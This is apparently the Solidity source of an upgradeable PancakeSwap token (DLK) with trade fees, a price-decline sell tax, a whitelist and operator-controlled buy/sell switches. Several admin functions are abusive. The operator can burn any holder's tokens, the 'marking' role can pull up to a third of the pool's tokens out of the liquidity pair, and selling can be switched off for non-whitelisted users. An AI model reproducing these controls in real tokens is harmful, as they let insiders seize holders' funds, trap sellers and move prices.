// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin-upgrades/contracts/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin-upgrades/contracts/token/ERC20/extensions/ERC20BurnableUpgradeable.sol";
import "@openzeppelin-upgrades/contracts/proxy/utils/Initializable.sol";
import "@openzeppelin-upgrades/contracts/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";

import "@pancake-v2-core/interfaces/IPancakePair.sol";
import "@pancake-v2-core/interfaces/IPancakeFactory.sol";
import "@pancake-v2-periphery/interfaces/IPancakeRouter02.sol";

import {TradeSlippage} from "../../utils/TradeSlippage.sol";
import {SwapHelper} from "../../utils/SwapHelper.sol";
import "../../utils/TradeSlippage.sol";
import "./DappLinkTokenStorage.sol";

contract DappLinkToken is Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable, OwnableUpgradeable, TradeSlippage, DappLinkTokenStorage {
    string private constant NAME = "DappLink Tokn";
    string private constant SYMBOL = "DLK";

    modifier onlyOperator() {
        require(msg.sender == operator, "DappLinkToken: caller is not the operator");
        _;
    }

    modifier onlyMarking() {
        require(msg.sender == marking, "DappLinkToken onlyMarking: Only Marking can call this function");
        _;
    }

    modifier onlyCaller() {
        require(msg.sender == caller, "DappLinkToken onlyMarking: Only caller can call this function");
        _;
    }

    constructor() {
        _disableInitializers();
    }

    function initialize(
        address _owner,
        address _usdt,
        address _v2Factory,
        address _v2Router,
        address _treasureAddress,
        address _marking,
        address _operator,
        address _caller
    ) public initializer {
        require(_owner != address(0), "DappLinkToken initialize: _owner can't be zero address");
        require(_v2Factory != address(0), "DappLinkToken initialize: _v2Factory can't be zero address");
        require(_v2Router != address(0), "DappLinkToken initialize: _v2Router can't be zero address");
        __ERC20_init(NAME, SYMBOL);
        __ERC20Burnable_init();
        __Ownable_init(_owner);
        _transferOwnership(_owner);

        v2Factory = _v2Factory;
        v2Router = _v2Router;

        treasureAddress = _treasureAddress;
        USDT = _usdt;

        marking = _marking;
        operator = _operator;
        caller = _caller;

        EnumerableSet.add(factories, _v2Factory);
        mainPair = IPancakeFactory(_v2Factory).createPair(USDT, address(this));
    }

    function _update(address from, address to, uint256 value) internal override {
        if (from == address(this)) {
            super._update(from, to, value);
            return;
        }

        if (isWhitelisted(from, to) || !isAllocation) {
            super._update(from, to, value);
            return;
        }

        (bool isBuy, bool isSell,,,,) = _getTradeFlags(from, to, value);

        if (isBuy && !isOpenBuy) {
            revert("DappLinkToken: Buying is not enabled yet");
        }

        if (isSell && !isOpenSell) {
            revert("DappLinkToken: Selling is not enabled yet");
        }

        if (isSell || isBuy) {
            value = _takeTradeFee(from, value);
        }

        if (isSell) {
            value = _takeDeclineTax(from, value);
        }

        super._update(from, to, value);
    }

    function getDeclineTaxRate(uint256 value, bool isSell) internal returns (uint256 sellTax) {
        if (!isSell || latestChoPrice == 0 || value == 0) {
            return 0;
        }

        uint256 currentPrice = quote(1000000);
        if (currentPrice >= latestChoPrice) {
            return 0;
        }

        uint256 declineRate = ((latestChoPrice - currentPrice) * BPS_DENOMINATOR) / latestChoPrice;
        if (declineRate >= PRICE_DROP_6_BPS) {
            sellTax = (value * DOWN_TAX_6_BPS) / BPS_DENOMINATOR;
        } else if (declineRate >= PRICE_DROP_3_BPS) {
            sellTax = (value * DOWN_TAX_3_BPS) / BPS_DENOMINATOR;
        }

        if (sellTax > 0) {
            downsideTax = sellTax;
        }
        emit DeclineTaxApplied(value, declineRate, sellTax);
    }


    function isWhitelisted(address from, address to) public view returns (bool) {
        return EnumerableSet.contains(whiteList, from) || EnumerableSet.contains(whiteList, to);
    }

    function addWhitelist(address[] memory _address) external onlyOperator {
        for (uint256 i = 0; i < _address.length; i++) {
            EnumerableSet.add(whiteList, _address[i]);
        }
    }

    function removeWhitelist(address[] memory _address) external onlyOperator {
        for (uint256 i = 0; i < _address.length; i++) {
            EnumerableSet.remove(whiteList, _address[i]);
        }
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function getTreasureAddress() external view returns (address) {
        return treasureAddress;
    }

    function setPoolAddress(DappLinkPool memory _pool) external onlyOperator {
        _beforeAllocation();
        _beforePoolAddress(_pool);
        dlPool = _pool;
        emit SetPoolAddress(_pool);
    }

    function poolAllocate() external onlyOwner {
        _beforeAllocation();
        _mint(dlPool.lpPool, (MaxTotalSupply * 10) / 100);
        _mint(dlPool.nftPool, (MaxTotalSupply * 90) / 100);
        isAllocation = true;
    }

    function setTreasureAddress(address _treasureAddress) external onlyOperator {
        require(_treasureAddress != address(0), "YoloToken: _fomoTreasureAddress cannot be zero address");
        treasureAddress = _treasureAddress;
        emit SetTreasureAddress(treasureAddress);
    }

    function updateChoPrice() external onlyCaller { // todo: 最佳的方式是用预言机的价格
        (uint256 rOther, uint256 rThis,,) = getReserves(mainPair, address(this));
        latestChoPrice = IPancakeRouter01(v2Router).getAmountOut(1000000, rThis, rOther);
        emit UpdateChoPrice(block.timestamp, block.number, latestChoPrice);
    }

    function burn(address user, uint256 _amount) external onlyOperator {
        _burn(user, _amount);
        _lpBurnedTokens += _amount;
        emit Burn(_amount, totalSupply());
    }

    function setMarking(address _marking) external onlyOperator {
        require(_marking != address(0), "YoloToken: marking cannot be zero address");
        marking = _marking;
        emit SetMarking(_marking);
    }

    function recycle(uint256 amount) external onlyMarking {
        address pair = mainPair;
        require(pair != address(0), "YoloToken: pair not set");
        uint256 maxBurn = balanceOf(pair) / 3;
        uint256 recycleAmount = amount >= maxBurn ? maxBurn : amount;
        if (recycleAmount > 0) {
            super._update(pair, marking, recycleAmount);
            IPancakePair(pair).sync();
            emit Recycle(pair, marking, recycleAmount);
        }
    }

    // ==================== internal function =============================
    function _beforeAllocation() internal virtual {
        require(!isAllocation, "DappLinkToken _beforeAllocation:Fishcake is already allocate");
    }

    function _beforePoolAddress(DappLinkPool memory _pool) internal virtual {
        require(_pool.lpPool != address(0), "Missing allocate lpPoo address");
        require(_pool.nftPool != address(0), "Missing allocate nftPool address");
    }

    function quote(uint256 amount) public view returns (uint256) {
        (uint256 rOther, uint256 rThis,,) = getReserves(mainPair, address(this));
        return IPancakeRouter01(v2Router).getAmountOut(amount, rThis, rOther);
    }

    function quoteThis(uint256 amount) public view returns (uint256) {
        (uint256 rOther, uint256 rThis,,) = getReserves(mainPair, address(this));
        return IPancakeRouter01(v2Router).getAmountOut(amount, rOther, rThis);
    }

    function openBuy(bool _isOpenBuy) external onlyOperator {
        isOpenBuy = _isOpenBuy;
    }

    function openSell(bool _isOpenSell) external onlyOperator {
        isOpenSell = _isOpenSell;
    }

    function _getTradeFlags(address from, address to, uint256 value) internal view returns (bool isBuy, bool isSell, bool isAddLiquidity, bool isRemoveLiquidity, uint256 rOther, uint256 rThis){
        return getTradeType(from, to, value, address(this));
    }

    function _takeTradeFee(address from, uint256 value) internal returns (uint256 remainingValue) {
        uint256 sellFee = (value * SELL_FEE_BPS) / BPS_DENOMINATOR;
        if (sellFee == 0) {
            return value;
        }

        uint256 burnAmount = (sellFee * 70) / 100;

        uint256 platformAmount = sellFee - burnAmount;

        if (burnAmount > 0) {
            _burn(from, burnAmount);
        }

        if (platformAmount > 0) {
            require(treasureAddress != address(0), "DappLinkToken: platform address not set");
            super._update(from, address(this), platformAmount);
            uint256 platformBalance = balanceOf(address(this));
            require(
                SwapHelper.swapV2(v2Router, address(this), USDT, platformBalance, 0, treasureAddress) > 0, "DappLinkToken: USDT swap failed"
            );
        }
        return value - sellFee;
    }

    function _takeDeclineTax(address from, uint256 value) internal returns (uint256 remainingValue) {
        uint256 taxAmount = getDeclineTaxRate(value, true);
        if (taxAmount > 0) {
            if (treasureAddress != address(0)) {
                super._update(from, treasureAddress, taxAmount);
            } else {
                _burn(from, taxAmount);
            }
            value -= taxAmount;
        }
        return value;
    }
}
